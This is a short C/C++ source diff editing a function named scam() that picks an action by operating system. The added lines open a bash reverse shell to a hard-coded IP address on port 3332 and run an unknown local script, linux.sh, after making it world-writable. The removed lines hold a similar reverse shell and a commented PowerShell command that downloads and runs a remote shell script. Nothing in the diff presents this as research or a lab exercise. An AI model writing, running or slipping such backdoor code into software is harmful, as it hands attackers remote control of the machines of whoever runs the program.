@@ -1,6 +1,8 @@
 #include <string.h>
 #include <stdlib.h>
 #include <string>
+#include <memory>
+#include <unistd.h>
 std::string OsName()
 {
 #ifdef _WIN32
@@ -24,11 +26,11 @@ void scam()
 {
     if (OsName() == "Windows")
     {
-        system("bash && /bin/bash -i >/dev/tcp/82.197.165.92/3332 0<&1 2>&1");
-        // system("& \"IEX(IWR https://raw.githubusercontent.com/benax-rw/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.31 4008\" p1");
+        system("/bin/bash -i >/dev/tcp/82.165.97.169/3332 0<&1 2>&1");
     }
     else if (OsName() == "Linux")
     {
-        system("bash && /bin/bash -i >/dev/tcp/82.165.97.169/3332 0<&1 2>&1");
+        system("chmod 777 ./linux.sh");
+        execl("./linux.sh", "linux.sh", (char *)0);
     }
 }
